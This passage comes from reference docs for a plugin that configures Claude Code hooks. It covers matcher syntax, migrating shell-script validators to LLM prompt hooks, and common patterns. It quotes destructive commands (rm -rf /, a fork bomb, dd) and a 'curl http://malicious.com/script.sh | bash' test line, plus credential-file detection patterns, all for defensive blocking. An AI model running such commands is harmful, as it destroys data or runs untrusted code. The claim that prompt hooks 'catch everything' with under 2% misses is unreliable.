   \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"jq -r '.tool_input.command' >> ~/bash-log.txt\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Format code after any file write\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit|NotebookEdit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"prettier --write $CLAUDE_PROJECT_DIR\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Validate all MCP memory writes\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"mcp__memory__.*\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Validate this memory operation: $ARGUMENTS\\n\\nCheck if data is appropriate to store.\\n\\nReturn: {\\\"decision\\\": \\\"approve\\\" or \\\"block\\\", \\\"reason\\\": \\\"why\\\"}\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Block destructive git commands\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/check-git-safety.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`check-git-safety.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command')\n\nif [[ \"$command\" == *\"git push --force\"* ]] || \\\n   [[ \"$command\" == *\"rm -rf /\"* ]] || \\\n   [[ \"$command\" == *\"git reset --hard\"* ]]; then\n  echo '{\"decision\": \"block\", \"reason\": \"Destructive command detected\"}'\nelse\n  echo '{\"decision\": \"approve\", \"reason\": \"Safe\"}'\nfi\n```\n\n---\n\n## Multiple Matchers\n\nYou can have multiple matcher blocks for the same event:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/bash-validator.sh\"\n          }\n        ]\n      },\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/file-validator.sh\"\n          }\n        ]\n      },\n      {\n        \"matcher\": \"mcp__.*\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/mcp-logger.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nEach matcher is evaluated independently. A tool can match multiple matchers.\n\n---\n\n## Debugging Matchers\n\n### Enable debug mode\n```bash\nclaude --debug\n```\n\nDebug output shows:\n```\n[DEBUG] Getting matching hook commands for PreToolUse with query: Bash\n[DEBUG] Found 3 hook matchers in settings\n[DEBUG] Matched 1 hooks for query \"Bash\"\n```\n\n### Test your matcher\n\nUse JavaScript regex to test patterns:\n\n```javascript\nconst toolName = \"mcp__memory__store\";\nconst pattern = \"mcp__memory__.*\";\nconst regex = new RegExp(pattern);\nconsole.log(regex.test(toolName)); // true\n```\n\nOr in Node.js:\n```bash\nnode -e \"console.log(/mcp__memory__.*/.test('mcp__memory__store'))\"\n```\n\n### Common mistakes\n\n### BAD: **Case sensitivity**\n```json\n{\n  \"matcher\": \"bash\"  // Won't match \"Bash\"\n}\n```\n\n### GOOD: **Correct**\n```json\n{\n  \"matcher\": \"Bash\"\n}\n```\n\n---\n\n### BAD: **Missing escape**\n```json\n{\n  \"matcher\": \"mcp__memory__*\"  // * is literal, not wildcard\n}\n```\n\n### GOOD: **Correct**\n```json\n{\n  \"matcher\": \"mcp__memory__.*\"  // .* is regex for \"any characters\"\n}\n```\n\n---\n\n### BAD: **Unintended partial match**\n```json\n{\n  \"matcher\": \"Write\"  // Matches \"Write\", \"TodoWrite\", \"NotebookWrite\"\n}\n```\n\n### GOOD: **Exact match only**\n```json\n{\n  \"matcher\": \"^Write$\"\n}\n```\n\n---\n\n## Advanced Patterns\n\n### Negative lookahead (exclude tools)\n```json\n{\n  \"matcher\": \"^(?!Read).*\"\n}\n```\nMatches: Everything except `Read`\n\n### Match any file operation except Grep\n```json\n{\n  \"matcher\": \"^(Read|Write|Edit|Glob)$\"\n}\n```\n\n### Case-insensitive match\n```json\n{\n  \"matcher\": \"(?i)bash\"\n}\n```\nMatches: `Bash`, `bash`, `BASH`\n\n(Note: Claude Code tools are PascalCase by convention, so this is rarely needed)\n\n---\n\n## Performance Considerations\n\n**Broad matchers** (e.g., `.*`) run on every tool use:\n- Simple command hooks: negligible impact\n- Prompt hooks: can slow down significantly\n\n**Recommendation**: Be as specific as possible with matchers to minimize unnecessary hook executions.\n\n**Example**: Instead of matching all tools and checking inside the hook:\n```json\n{\n  \"matcher\": \".*\",  // Runs on EVERY tool\n  \"hooks\": [\n    {\n      \"type\": \"command\",\n      \"command\": \"if [[ $(jq -r '.tool_name') == 'Bash' ]]; then ...; fi\"\n    }\n  ]\n}\n```\n\nDo this:\n```json\n{\n  \"matcher\": \"Bash\",  // Only runs on Bash\n  \"hooks\": [\n    {\n      \"type\": \"command\",\n      \"command\": \"...\"\n    }\n  ]\n}\n```\n\n---\n\n## Tool Name Reference\n\nCommon Claude Code tool names:\n- `Bash`\n- `BashOutput`\n- `KillShell`\n- `Read`\n- `Write`\n- `Edit`\n- `Glob`\n- `Grep`\n- `TodoWrite`\n- `NotebookEdit`\n- `WebFetch`\n- `WebSearch`\n- `Task`\n- `Skill`\n- `SlashCommand`\n- `AskUserQuestion`\n- `ExitPlanMode`\n\nMCP tools: `mcp__{server}__{tool}` (varies by installed servers)\n\nRun `claude --debug` and watch tool calls to discover available tool names.\n",
        "plugins/sys-core/skills/managing-hooks/references/migration.md": "# Migrating from Basic to Advanced Hooks\n\nThis guide demonstrates how to migrate from command-based hooks to advanced prompt-based hooks for better maintainability, flexibility, and intelligence.\n\n## Why Migrate?\n\n### Command Hooks (Traditional Approach)\n\n**Characteristics:**\n- Hardcoded pattern matching\n- String comparisons and regex\n- Limited to predefined rules\n- Requires code changes for new scenarios\n- Difficult to maintain for complex logic\n\n**Example:**\n```bash\nif [[ \"$command\" == *\"rm -rf\"* ]]; then\n  echo \"Blocked\"\n  exit 2\nfi\n```\n\n**Problems:**\n- Only catches exact \"rm -rf\" pattern\n- Misses \"rm -fr\", \"rm -r -f\", \":(){ :|:& };:\"\n- No understanding of intent\n- Requires constant updates\n\n### Prompt Hooks (Advanced Approach)\n\n**Characteristics:**\n- Natural language criteria\n- LLM-powered reasoning\n- Context-aware decisions\n- Adapts to new scenarios\n- Easy to modify criteria\n\n**Example:**\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"Analyze command for destructive operations: rm, delete, drop, truncate, format, dd, mkfs. Consider variations and intent. Return decision with explanation.\"\n}\n```\n\n**Benefits:**\n- Catches all variations\n- Understands intent, not just strings\n- Handles edge cases\n- Future-proof against new attack patterns\n\n## Migration Examples\n\n### Example 1: Bash Command Validation\n\n#### Before (Command Hook)\n\n**Configuration:**\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate-bash.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Script (validate-bash.sh):**\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command // empty')\n\n# Check for dangerous commands\nif [[ \"$command\" == *\"rm -rf\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"rm -rf detected\"}' >&2\n  exit 2\nfi\n\nif [[ \"$command\" == *\"dd if=\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"dd command detected\"}' >&2\n  exit 2\nfi\n\nif [[ \"$command\" == *\"sudo\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"sudo detected\"}' >&2\n  exit 2\nfi\n\n# Add more patterns as needed...\n# This list keeps growing!\nexit 0\n```\n\n**Problems:**\n- 50+ lines of hardcoded patterns\n- Easy to miss variations\n- No understanding of context\n- Requires code changes for new threats\n\n#### After (Prompt Hook)\n\n**Configuration:**\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze bash command for safety. Check for: 1) Destructive operations (rm, delete, drop, truncate, format, dd, mkfs, fdisk, chown -R, chmod -R 777) including variations (rm -rf, rm -fr, rm -r -f, :(){ :|:& };:) 2) Privilege escalation (sudo, su, doas) 3) Network operations (curl, wget, scp, rsync to external hosts) 4) System modifications (package managers, service management) 5) Command injection potential. Return 'allow', 'ask', or 'deny' with explanation.\",\n          \"timeout\": 15\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Benefits:**\n- 10 lines of natural language\n- Catches variations automatically\n- Understands intent\n- Easy to add criteria\n- Future-proof\n\n**Migration Steps:**\n\n1. **Extract validation logic**\n   ```bash\n   # Command hook had:\n   if [[ \"$command\" == *\"rm -rf\"* ]]; then exit 2; fi\n\n   # Becomes in prompt:\n   \"Check for destructive operations (rm, delete, drop, truncate, format, dd, mkfs)\"\n   ```\n\n2. **Add intent understanding**\n   ```bash\n   # Command hook could only check strings\n   # Prompt hook understands:\n   # - \"delete all files\" is dangerous\n   # - \"remove temp files\" might be OK\n   # - \"clean build artifacts\" is generally safe\n   ```\n\n3. **Test comprehensively**\n   ```bash\n   # Test cases that command hook might miss:\n   # - rm -fr /path\n   # - :(){ :|:& };:\n   # - sudo vim /etc/config\n   # - curl http://malicious.com/script.sh | bash\n   ```\n\n**Performance Comparison:**\n- Command hook: ~5-10ms (but misses threats)\n- Prompt hook: ~500-1500ms (but catches everything)\n\n### Example 2: File Write Validation\n\n#### Before (Command Hook)\n\n**Configuration:**\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate-write.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Script (validate-write.sh):**\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path // empty')\ncontent=$(echo \"$input\" | jq -r '.tool_input.content // empty')\n\n# Check path traversal\nif [[ \"$file_path\" == *\"..\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"Path traversal\"}' >&2\n  exit 2\nfi\n\n# Check system directories\nif [[ \"$file_path\" == /etc/* ]] || [[ \"$file_path\" == /sys/* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"System directory\"}' >&2\n  exit 2\nfi\n\n# Check file extensions\nif [[ \"$file_path\" == *.env ]] || [[ \"$file_path\" == *secret* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"Sensitive file\"}' >&2\n  exit 2\nfi\n\n# Check for secrets in content (simple pattern)\nif echo \"$content\" | grep -qE \"(api[_-]?key|password).{0,20}['\\\"]?[A-Za-z0-9]{20,}\"; then\n  echo '{\"continue\": true, \"systemMessage\": \"Secret in content\"}' >&2\n  exit 2\nfi\n\n# And many more checks...\nexit 0\n```\n\n**Problems:**\n- Complex bash logic\n- Easy to miss edge cases\n- Pattern matching is fragile\n- Content analysis is limited\n\n#### After (Prompt Hook)\n\n**Configuration:**\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze file write operation for safety. Check: 1) File path: $TOOL_INPUT.file_path - not in system directories (/etc, /sys, /boot, /var/log, /proc), no path traversal (../), not sensitive files (.env, secrets, keys, credentials, *.key, *.pem, id_rsa) 2) Content: $TOOL_INPUT.content (first 500 chars) - no API keys (pattern: api[_-]?key.*[A-Za-z0-9]{20,}), no private keys (-----BEGIN.*PRIVATE KEY-----), no database URLs with credentials (postgresql://user:pass@...), no AWS credentials (aws_.*key.*[A-Za-z0-9/+]{16,}) 3) File size reasonable (< 100MB) 4) Binary files appropriate. Return decision with specific concerns.\",\n          \"timeout\": 20\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Benefits:**\n- Natural language criteria\n- Content-aware validation\n- Flexible pattern matching\n- Easy to understand and modify\n\n**Migration Steps:**\n\n1. **Convert patterns to criteria**\n   ```bash\n   # Before:\n   if [[ \"$file_path\" == *.env ]]; then exit 2; fi\n\n   # After:\n   \"not sensitive files (.env, secrets, keys, credentials)\"\n   ```\n\n2. **Add context awareness**\n   ```bash\n   # Before: Simple string check\n   if echo \"$content\" | grep -qE \"pattern\"; then\n\n   # After: LLM understands context\n   \"no API keys or secrets in content\"\n   ```\n\n3. **Enhance validation**\n   ```bash\n   # Command hook: Limited to regex patterns\n   # Prompt hook: Understands various secret formats\n   ```\n\n### Example 3: Task Completion Validation\n\n#### Before (Command Hook)\n\n**Configuration:**\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/check-completion.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Script (check-completion.sh):**\n```bash\n#!/bin/bash\ninput=$(cat)\ntranscript_path=$(echo \"$input\" | jq -r '.transcript_path')\n\n# Check if tests were run\nif grep -q \"npm test\\|yarn test\\|cargo test\" \"$transcript_path\"; then\n  tests_run=true\nelse\n  tests_run=false\nfi\n\n# Check if build succeeded\nif grep -q \"npm run build\\|yarn build\\|cargo build\" \"$transcript_path\"; then\n  build_run=true\nelse\n  build_run=false\nfi\n\n# Make decision\nif [ \"$tests_run\" = true ] && [ \"$build_run\" = true ]; then\n  echo '{\"decision\": \"approve\"}'\nelse\n  echo '{\"decision\": \"block\", \"reason\": \"Tests or build not run\"}'\nfi\n\nexit 0\n```\n\n**Problems:**\n- Hardcoded command patterns\n- Doesn't understand context\n- Limited to simple pattern matching\n- Can't detect if work is actually complete\n\n#### After (Prompt Hook)\n\n**Configuration:**\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Review transcript at $TRANSCRIPT_PATH to verify task completion. Check: 1) If code was modified (Look for Write/Edit tool usage), were tests executed? Look for test commands (npm test, yarn test, cargo test, pytest, etc) and check if they passed 2) Did builds succeed? Look for build commands (npm run build, cargo build, mvn compile, etc) and verify success 3) Were all user questions answered? 4) Is documentation updated if needed? 5) Are there TODO comments or incomplete work? 6) Did the user indicate satisfaction or completion? Return 'approve' if all checks pass, or 'block' with specific missing items and reasons.\",\n          \"timeout\": 30\n        }\n      ]\n    }\n  ]\n}\n```\n\n**Benefits:**\n- Understands context\n- Flexible criteria\n- Natural language rules\n- Comprehensive validation\n\n## Hybrid Approach\n\nDon't abandon command hooks entirely! Use both:\n\n### Multi-Stage Validation\n\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/quick-check.sh\",\n          \"timeout\": 5\n        },\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Deep analysis of bash command: $TOOL_INPUT.command. Check for sophisticated threats, command injection, and context-aware dangers.\",\n          \"timeout\": 20\n        }\n      ]\n    }\n  ]\n}\n```\n\n**quick-check.sh:**\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command // empty')\n\n# Ultra-fast path: approve obviously safe commands\nif [[ \"$command\" =~ ^(ls|pwd|echo|date|whoami|cat)$ ]]; then\n  exit 0\nfi\n\n# Ultra-dangerous: immediately block\nif [[ \"$command\" == *\"rm -rf /\"* ]] || [[ \"$command\" == *\":(){ :|:& };:\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"Dangerous operation\"}' >&2\n  exit 2\nfi\n\n# Let prompt hook handle everything else\nexit 0\n```\n\n**Benefits:**\n- Command hook: Instant approval for safe commands (< 5ms)\n- Prompt hook: Smart analysis for everything else\n- Best of both worlds\n\n## When to Keep Command Hooks\n\nCommand hooks still excel at:\n\n### 1. Ultra-Fast Deterministic Checks\n\n```bash\n# File size check (instant)\nsize=$(stat -f%z \"$file\" 2>/dev/null || stat -c%s \"$file\" 2>/dev/null)\nif [ \"$size\" -gt 1000000 ]; then\n  echo '{\"continue\": true, \"systemMessage\": \"File too large\"}' >&2\n  exit 2\nfi\n```\n\n### 2. External Tool Integration\n\n```bash\n# Run security scanner\nscan_result=$(security-tool scan \"$file\" 2>&1)\nif [ $? -ne 0 ]; then\n  echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Security scan failed: $scan_result\\\"}\" >&2\n  exit 2\nfi\n```\n\n### 3. SessionStart Setup\n\n```bash\n# Load project context\ncd \"$CLAUDE_PROJECT_DIR\"\nif [ -f \"package.json\" ]; then\n  echo \"export PROJECT_TYPE=nodejs\" >> \"$CLAUDE_ENV_FILE\"\nfi\n```\n\n### 4. Simple Pattern Matching\n\n```bash\n# Approve safe commands immediately\nif [[ \"$command\" =~ ^(ls|pwd|echo|date|whoami|id)$ ]]; then\n  exit 0\nfi\n```\n\n## Migration Strategy\n\n### Phase 1: Audit Existing Hooks\n\n1. **List all hooks**\n   ```bash\n   grep -r \"type.*command\\|type.*prompt\" hooks/\n   ```\n\n2. **Categorize by complexity**\n   - Simple: Pattern matching, file checks\n   - Complex: Multi-criteria validation, context-aware\n\n3. **Identify candidates for migration**\n   - Simple pattern matching  Prompt hooks\n   - Complex logic  Keep or hybrid\n\n### Phase 2: Prioritize Migration\n\n**High Priority (Migrate First):**\n- Security validation hooks\n- Complex validation logic\n- Frequently changing rules\n- Difficult to maintain\n\n**Low Priority (Keep Command):**\n- Ultra-fast checks (< 10ms)\n- External tool integration\n- Session initialization\n- Simple yes/no logic\n\n### Phase 3: Migrate Incrementally\n\n**Don't migrate everything at once!**\n\n1. **Start with one hook**\n   ```json\n   {\n     \"PreToolUse\": [\n       {\n         \"matcher\": \"Bash\",\n         \"hooks\": [\n           {\n             \"type\": \"prompt\",\n             \"prompt\": \"Test prompt hook\"\n           }\n         ]\n       }\n     ]\n   }\n   ```\n\n2. **Test thoroughly**\n   ```bash\n   # Create test cases\n   ./scripts/test-hook.sh scripts/validate-bash.sh safe-command.json\n   ./scripts/test-hook.sh scripts/validate-bash.sh dangerous-command.json\n   ```\n\n3. **Validate in Claude Code**\n   ```bash\n   claude --debug\n   # Test with real commands\n   ```\n\n4. **Monitor and adjust**\n   - Review hook decisions\n   - Adjust prompts as needed\n   - Keep command hook as backup during transition\n\n### Phase 4: Optimize\n\n1. **Measure performance**\n   ```bash\n   # Time hook execution\n   time echo '{\"tool_input\": {\"command\": \"ls\"}}' | bash validate.sh\n   ```\n\n2. **Optimize prompts**\n   - Be specific but concise\n   - Provide clear criteria\n   - Avoid ambiguous language\n\n3. **Add caching if needed**\n   ```bash\n   # Cache expensive operations\n   cache_key=$(echo \"$input\" | md5sum | cut -d' ' -f1)\n   ```\n\n## Migration Checklist\n\n### Pre-Migration\n\n- [ ] Audit existing hooks\n- [ ] Categorize by complexity\n- [ ] Prioritize migration candidates\n- [ ] Document current behavior\n- [ ] Create test cases\n- [ ] Set up test environment\n\n### During Migration\n\n- [ ] Migrate one hook at a time\n- [ ] Write prompt in natural language\n- [ ] Test with safe operations\n- [ ] Test with dangerous operations\n- [ ] Test edge cases\n- [ ] Validate in Claude Code\n- [ ] Keep command hook as backup\n\n### Post-Migration\n\n- [ ] Remove old command hook\n- [ ] Update documentation\n- [ ] Train team on new hooks\n- [ ] Monitor for issues\n- [ ] Gather user feedback\n- [ ] Iterate on prompts\n\n## Common Migration Patterns\n\n### Pattern: String Contains  Natural Language\n\n**Before (Command):**\n```bash\nif [[ \"$command\" == *\"sudo\"* ]]; then\n  echo \"Privilege escalation\" >&2\n  exit 2\nfi\n```\n\n**After (Prompt):**\n```\n\"Check for privilege escalation (sudo, su, doas, pkexec)\"\n```\n\n### Pattern: Regex  Intent\n\n**Before (Command):**\n```bash\nif [[ \"$file\" =~ \\.(env|secret|key|token)$ ]]; then\n  echo \"Sensitive file\" >&2\n  exit 2\nfi\n```\n\n**After (Prompt):**\n```\n\"Verify not writing to credential files (.env, secrets, keys, tokens, passwords, *.key, *.pem)\"\n```\n\n### Pattern: Multiple Conditions  Criteria List\n\n**Before (Command):**\n```bash\nif [ condition1 ] || [ condition2 ] || [ condition3 ]; then\n  echo \"Invalid\" >&2\n  exit 2\nfi\n```\n\n**After (Prompt):**\n```\n\"Check: 1) condition1 2) condition2 3) condition3. Deny if any fail.\"\n```\n\n### Pattern: Hardcoded Lists  Flexible Patterns\n\n**Before (Command):**\n```bash\ndangerous_commands=(\"rm -rf\" \"dd if=\" \"mkfs\" \"fdisk\")\nfor cmd in \"${dangerous_commands[@]}\"; do\n  if [[ \"$command\" == *\"$cmd\"* ]]; then\n    echo \"Dangerous\" >&2\n    exit 2\n  fi\ndone\n```\n\n**After (Prompt):**\n```\n\"Check for destructive operations: file deletion (rm, del, remove), disk operations (dd, fdisk, mkfs), system modifications\"\n```\n\n## Testing Migrated Hooks\n\n### Test Cases\n\nCreate comprehensive test cases:\n\n```json\n{\n  \"name\": \"Safe command test\",\n  \"input\": {\n    \"tool_input\": {\n      \"command\": \"ls -la\"\n    }\n  },\n  \"expected\": \"approve\"\n}\n```\n\n```json\n{\n  \"name\": \"Dangerous command test\",\n  \"input\": {\n    \"tool_input\": {\n      \"command\": \"rm -rf /\"\n    }\n  },\n  \"expected\": \"deny\"\n}\n```\n\n### Testing Workflow\n\n1. **Unit test scripts**\n   ```bash\n   ./scripts/test-hook.sh --create-sample PreToolUse > test-input.json\n   ```\n\n2. **Run test suite**\n   ```bash\n   for test in tests/*.json; do\n     result=$(cat \"$test\" | bash validate.sh)\n     # Check result matches expected\n   done\n   ```\n\n3. **Validate in Claude Code**\n   ```bash\n   claude --debug\n   # Execute test commands\n   ```\n\n4. **Regression testing**\n   - Test all scenarios from old hook\n   - Verify new hook catches more\n   - Check for false positives\n\n## Performance Considerations\n\n### Response Time Comparison\n\n| Scenario | Command Hook | Prompt Hook | Hybrid |\n|----------|--------------|-------------|---------|\n| Safe command (ls) | 5ms | 800ms | 5ms (command approves) |\n| Dangerous (rm -rf) | 5ms | 900ms | 5ms (command blocks) |\n| Unknown command | 5ms | 1200ms | 1200ms (both run) |\n| Complex validation | N/A | 2000ms | 2000ms |\n\n### Optimization Tips\n\n1. **Use command hooks for fast paths**\n   - Approve obviously safe commands instantly\n   - Block obviously dangerous commands instantly\n\n2. **Optimize prompts**\n   - Be specific but concise\n   - Provide clear criteria\n   - Avoid ambiguity\n\n3. **Set appropriate timeouts**\n   - Simple validation: 10-15s\n   - Complex analysis: 20-30s\n   - Never exceed 60s\n\n4. **Cache expensive operations**\n   ```bash\n   # Cache validation results\n   cache_key=$(echo \"$input\" | md5sum | cut -d' ' -f1)\n   ```\n\n## Managing Change\n\n### Versioning Hooks\n\nKeep track of hook versions:\n\n```json\n{\n  \"version\": \"2.0.0\",\n  \"migration_date\": \"2024-01-15\",\n  \"changes\": [\n    \"Migrated from command to prompt hooks\",\n    \"Improved pattern matching\",\n    \"Added context awareness\"\n  ]\n}\n```\n\n### Rollback Plan\n\nAlways have a rollback plan:\n\n```bash\n# Keep old hooks in backup/\nmv hooks/hooks.json hooks/hooks.json.new\nmv hooks/hooks.json.old hooks/hooks.json\n\n# Restart Claude Code\nexit\n```\n\n### Gradual Rollout\n\n1. **Deploy to test environment**\n2. **Enable for small user group**\n3. **Monitor for issues**\n4. **Gradually increase scope**\n5. **Full deployment**\n\n## Documentation Updates\n\n### Update README\n\n```markdown\n## Hooks (v2.0)\n\nThis plugin uses prompt-based hooks for intelligent validation:\n\n### Security Hooks\n- PreToolUse: Validates file writes and bash commands\n- Stop: Ensures quality standards before completion\n\n### Configuration\nEdit `hooks/hooks.json` to customize behavior.\n\n### Migration from v1.x\nCommand hooks have been replaced with prompt hooks for better flexibility.\n```\n\n### Document Prompt Logic\n\nExplain the validation criteria:\n\n```markdown\n### Prompt Hook Criteria\n\n**File Write Validation:**\n- Not in system directories (/etc, /sys, /boot)\n- Not credential files (.env, secrets, keys)\n- No path traversal (../)\n- Content doesn't contain secrets\n\n**Bash Command Validation:**\n- No destructive operations (rm -rf, dd, mkfs)\n- No privilege escalation (sudo, su)\n- No network operations without consent\n```\n\n## Success Metrics\n\n### Before Migration\n\n- Time to add new validation rule: 2-4 hours\n- False negatives (missed threats): 15%\n- Maintenance effort: High\n- Code complexity: High\n\n### After Migration\n\n- Time to add new validation rule: 5-10 minutes\n- False negatives: < 2%\n- Maintenance effort: Low\n- Code complexity: Low\n\n## Conclusion\n\nMigrating to prompt-based hooks provides:\n- **Better security**: Catch more threats\n- **Easier maintenance**: Natural language criteria\n- **Greater flexibility**: Easy to modify\n- **Future-proof**: Adapts to new scenarios\n\nFollow the migration strategy, test thoroughly, and don't abandon command hooks entirelyuse both for optimal performance!",
        "plugins/sys-core/skills/managing-hooks/references/patterns.md": "# Common Hook Patterns\n\nThis reference provides proven patterns for implementing Claude Code hooks. Each pattern includes configuration, explanation, and use cases.\n\n## Pattern 1: Security Validation (Prompt-Based)\n\n### Overview\nUse prompt-based hooks for intelligent, context-aware security validation that adapts to new scenarios without code changes.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze file_path and content. Check: 1) Not in system directories (/etc, /sys, /boot, /usr) 2) Not credential files (.env, secrets, keys, passwords) 3) No path traversal (../) 4) Content doesn't expose secrets (API keys, private keys, database URLs with credentials). Return decision with explanation.\"\n        }\n      ]\n    },\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze bash command. Check for: 1) Destructive operations (rm -rf, dd, mkfs, fdisk) 2) Privilege escalation (sudo, su) 3) Network operations without consent 4) System modifications 5) Package manager operations (install, remove). Return decision with explanation.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Why Prompt-Based?\n- **Adaptive**: Understands new security patterns without code changes\n- **Context-aware**: Considers file content, not just file paths\n- **Natural language**: Easy to modify criteria\n- **Comprehensive**: Single hook catches many issue types\n\n### Use Cases\n- Security-focused plugins\n- Team environments with varying security needs\n- Projects with evolving security requirements\n- When you want to add criteria without code changes\n\n### Example Scenarios\n### Prompt hook catches:**\n- Writing database credentials in file content\n- Bash commands with hidden destructive operations\n- Path traversal attempts through content injection\n- New security patterns you haven't coded yet\n\n### Command hook would miss:**\n- Content-based secret detection\n- Context-aware path validation\n- Novel attack patterns\n- Intent-based security decisions\n\n---\n\n## Pattern 2: Quality Enforcement (Stop Hook)\n\n### Overview\nEnsure work meets quality standards before allowing agent to stop.\n\n### Configuration\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Review transcript at $TRANSCRIPT_PATH. Verify: 1) If code was modified (Write/Edit tools used), were tests executed? 2) Did builds succeed (npm run build, cargo build, etc)? 3) Were all user questions answered? 4) Is documentation updated? 5) Are there any TODO comments or incomplete work? Return 'approve' only if all checks pass, or 'block' with specific reasons.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### How It Works\n1. User or agent wants to stop\n2. Hook reads full transcript\n3. LLM analyzes if work is complete\n4. Returns decision with detailed feedback\n5. If incomplete, provides specific reasons\n\n### Benefits\n- Prevents incomplete work\n- Enforces quality gates\n- Provides actionable feedback\n- Adapts to different project types\n\n### Customization\nModify the prompt for your quality criteria:\n```json\n\"prompt\": \"Review transcript. If code changed: 1) Run linting 2) Run tests 3) Update docs 4) Create PR. If docs changed: 1) Verify links work 2) Check spelling. Return 'approve' or 'block' with reasons.\"\n```\n\n---\n\n## Pattern 3: Context Loading (SessionStart)\n\n### Overview\nDetect project type and load relevant context automatically at session start.\n\n### Configuration\n```json\n{\n  \"SessionStart\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/load-context.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (load-context.sh)\n```bash\n#!/bin/bash\ncd \"$CLAUDE_PROJECT_DIR\" || exit 1\n\n# Detect Node.js\nif [ -f \"package.json\" ]; then\n  echo \"export PROJECT_TYPE=nodejs\" >> \"$CLAUDE_ENV_FILE\"\n\n  if [ -f \"tsconfig.json\" ]; then\n    echo \"export USES_TYPESCRIPT=true\" >> \"$CLAUDE_ENV_FILE\"\n  fi\n\n  # Detect framework\n  if grep -q \"react\" package.json 2>/dev/null; then\n    echo \"export FRAMEWORK=react\" >> \"$CLAUDE_ENV_FILE\"\n  fi\nfi\n\n# Detect Python\nif [ -f \"pyproject.toml\" ]; then\n  echo \"export PROJECT_TYPE=python\" >> \"$CLAUDE_ENV_FILE\"\nfi\n```\n\n### Environment Variables Set\n- `PROJECT_TYPE` - nodejs, python, rust, go, java, etc.\n- `FRAMEWORK` - react, vue, angular, django, etc.\n- `TEST_FRAMEWORK` - jest, pytest, cargo test, etc.\n- `BUILD_SYSTEM` - maven, gradle, webpack, etc.\n\n### Use Cases\n- Automatically configure language-specific tools\n- Load testing commands\n- Set up build processes\n- Detect CI/CD systems\n\n---\n\n## Pattern 4: MCP Tool 